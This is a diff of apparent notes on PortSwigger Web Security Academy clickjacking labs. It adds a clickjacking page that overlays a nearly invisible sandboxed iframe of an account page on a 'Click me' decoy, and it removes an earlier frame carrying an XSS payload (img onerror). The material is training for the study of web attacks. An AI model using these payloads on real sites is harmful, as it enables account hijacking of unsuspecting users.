@@ -17,20 +17,22 @@ Analysis:
 
     Without sandbox parameter the iframe is not rendered in the web browser.
 Solution:
+  
   <style>
     iframe {
         position: relative; 
         height: 1000px; 
         width: 700px;
-        opacity: 0.1;
+        opacity: 0.0000001;
         z-index: 2;
     }
     div {
         position:absolute;
-        top:840px;
+        top:450px;
         left:80px;
         z-index: 1;
     }
 </style>
 <div>Click me</div>
-<iframe src="https://myPOrtSwiggerID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=sds@sds.com&subject=ddd&message=sssss" ></iframe>
+<iframe src="myPOrtSwiggerID.web-security-academy.net/my-account?email=aaaa@ere.com" sandbox="allow-forms"></iframe>
+
